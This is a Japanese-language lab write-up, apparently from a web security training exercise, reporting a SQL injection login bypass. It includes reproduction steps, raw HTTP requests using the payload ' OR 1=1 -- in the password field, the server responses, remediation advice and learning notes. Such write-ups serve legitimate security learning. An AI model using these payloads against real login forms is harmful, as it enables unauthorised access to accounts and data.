# Lab:  SQL injection vulnerability allowing login bypass

## 概要
対象アプリケーションのログインにおいて、usernameパラメータやpasswordパラメータの入力値がSQLに動的に連結していることを確認しました。  
ユーザ入力値に対するエスケープ処理やパラメータバインドをしていないため、攻撃者は認証をすりぬけて、意図しないログインを成立させることが可能です。  
本検証では ' OR 1=1 -- を使用して認証回避し、通常ログインしないと遷移できないページへ遷移したことをを確認しました。 この問題は認証回避や情報漏洩につながる重大なリスクを抱えています。

## 対象エンドポイント
csrf=vaY3jY9jzncgNZ1kN2tUYhtnVeTkNECM&username=administrator&password=

## 脆弱性の原因
csrf=67b3jeptYQR9pnX8smAzCjgaE82bsZRN& の username,password パラメータが SQL の WHERE 句に 動的に連結されているため、攻撃ポイントとなります。

## 影響度
本脆弱性を悪用されると、以下の影響が発生する可能性があります。

・任意のSQL実行
・データの全件取得
・認証回避（ログイン機能がある場合）
・データ改ざん
・管理者権限の奪取

## 再現手順
1 対象URLへアクセス https://〜/login　
2 username,password パラメータが SQL の WHERE 句に使用されていると推測しました。  
3 ' を入力し、500エラーが発生することを確認 → SQL 文が壊れていることを示します。  
4 usernameパラメータにadministrator、passwordパラメータに' OR 1=1 -- を入力し、認証をすり抜けたこと確認しました。 → 条件式が常に TRUEとなり、usersテーブルの結果セットの先頭行（administrator）が返却され、認証が成立しました。（usernameパラメータについてはadministratorでなく適当な文字でも認証すり抜けたこと確認しました。）  

<details>
<summary>3 HTTPリクエスト/レスポンス</summary>
  
リクエスト
POST /login HTTP/2
csrf=vaY3jY9jzncgNZ1kN2tUYhtnVeTkNECM&username=administrator&password='
  
レスポンス
HTTP/2 500 Internal Server Error
Internal Server Error

</details>
  
csrf=vaY3jY9jzncgNZ1kN2tUYhtnVeTkNECM&username=administrator&password=' OR 1=1 --
認証すり抜けできたこと確認しました。
 
<details>
<summary>4 HTTPリクエスト/レスポンス</summary>
  
リクエスト
POST /login HTTP/2
csrf=rbDJFRNtXk7k3TTIiOLsBEkyAhJveb3X&username=administrator&password=' OR 1=1 --
  
レスポンス
HTTP/2 302 Found
Location: /my-account?id=administrator

</details>
 
5 csrf=tpKp74evhAetZsQXUvFzrAdgIY7BrNXg&username=administrator&password=' OR 1=2 --
 SQL文は壊れず、正常に認証が通らなかったこと確認しました。
<details>
<summary>5 HTTPリクエスト/レスポンス</summary>
  
リクエスト
POST /login HTTP/2
csrf=tpKp74evhAetZsQXUvFzrAdgIY7BrNXg&username=a&password=' OR 1=2 --
  
レスポンス
HTTP/2 200 OK
<p class=is-warning>Invalid username or password.</p>
   
</details>


## 対策
プリペアドステートメントを使用し、ユーザ入力が文字連結しないようにしてください。
パラメータバインドを使用し、入力値をSQL文にを安全に渡すようしてください。
入力値のバリデーションを実施し、想定外の文字列（例：記号、制御文字、過度に長い文字列）を受け付けないようにしてください。


## 学習メモ（学んだこと）
・username パラメータに OR 条件を入れても、後続の password 条件が残るため論理式がTRUEにならず、SQLiが成立しないケースがあることを理解した。　
・password 側に OR 1=1 -- を入れると、AND条件の後半を攻撃者が制御できるため、認証バイパスが成立しやすい構造になっていると学んだ。



